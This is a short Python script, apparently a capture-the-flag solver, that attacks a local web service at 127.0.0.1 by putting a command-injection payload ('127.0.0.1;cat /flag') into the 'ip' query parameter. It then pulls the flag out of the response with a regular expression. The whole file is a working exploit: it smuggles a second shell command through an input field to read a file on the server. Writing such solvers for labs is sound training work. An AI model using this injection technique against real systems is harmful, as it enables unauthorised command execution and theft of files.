#!/usr/bin/env python3
import requests

BASE = 'http://127.0.0.1:13387'
payload = '127.0.0.1;cat /flag'

r = requests.get(f'{BASE}/?ip={payload}')
if 'flag{' in r.text:
    import re
    flag = re.search(r'flag\{[^}]+\}', r.text).group()
    print(f'[+] {flag}')
else:
    print('[-] flag not found')
